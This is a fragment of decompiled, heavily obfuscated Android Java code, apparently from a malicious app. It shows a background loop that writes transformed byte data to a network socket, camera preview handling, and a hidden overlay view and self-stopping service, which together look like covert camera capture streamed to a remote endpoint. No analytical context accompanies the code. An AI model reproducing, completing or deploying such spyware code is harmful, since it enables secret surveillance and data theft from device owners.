                    r1.append(r4)     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8 r4 = com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    java.lang.String[] r4 = r4.vul     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    r5 = 7
                    r4 = r4[r5]     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    r1.append(r4)     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    java.lang.String r1 = r1.toString()     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    byte[] r4 = r3.toByteArray()     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    byte[] r1 = com.appser.safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.cementyfattyvshoppingcomrmetalsomezmetadataknightscsyncxknowgallocationlconsistentlylsicnmistakeq37(r1, r4)     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    java.net.Socket r4 = com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k     // Catch:{ Exception -> 0x00df }
                    int r5 = r1.length     // Catch:{ Exception -> 0x00df }
                    int r5 = r5 * 15
                    r4.setSendBufferSize(r5)     // Catch:{ Exception -> 0x00df }
                    java.net.Socket r4 = com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_k     // Catch:{ Exception -> 0x00df }
                    java.io.OutputStream r4 = r4.getOutputStream()     // Catch:{ Exception -> 0x00df }
                    com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.o_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_ut = r4     // Catch:{ Exception -> 0x00df }
                    java.io.OutputStream r4 = com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.o_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_ut     // Catch:{ Exception -> 0x00df }
                    int r5 = r1.length     // Catch:{ Exception -> 0x00df }
                    r4.write(r1, r2, r5)     // Catch:{ Exception -> 0x00df }
                    goto L_0x00e4
                L_0x00df:
                    com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8 r1 = com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.this     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                    r1.sp()     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                L_0x00e4:
                    r3.close()     // Catch:{ OutOfMemoryError -> 0x00e7, OutOfMemoryError -> 0x00e7 }
                L_0x00e7:
                    r1 = 1
                    java.lang.Thread.sleep(r1)     // Catch:{ InterruptedException -> 0x00ee }
                    goto L_0x0011
                L_0x00ee:
                    goto L_0x0011
                L_0x00f1:
                    return
                */
                throw new UnsupportedOperationException("Method not decompiled: com.appser.futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.AnonymousClass3.run():void");
            }
        }).start();
    }

    public void onDestroy() {
        super.onDestroy();
        safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5.s_safarivreaderstrailsoincomingabreathnmailmanssettledccompetingjhintsoeffectivelyxicsftteenagex5_f1 = 0;
        st = null;
        sp();
    }

    public void sp() {
        try {
            if (c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_m != null) {
                c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_m.setPreviewCallback((Camera.PreviewCallback) null);
                c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_m.release();
                c_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_m = null;
            }
            di();
            if (!this.usd) {
                advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32.advertisementmownershipcisoddirectivegbulletemanagementcchemicalsminstantxcounterhexecutex32wm.removeView(s_futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8_fw);
            }
            this.usd = false;
        } catch (Exception unused) {
        }
        stopService(new Intent(this, futurewacceptablebbleedingbsandywwentglocallyxmiamidyarnkhundredsopublichfederationzolivern8.class));
    }
}
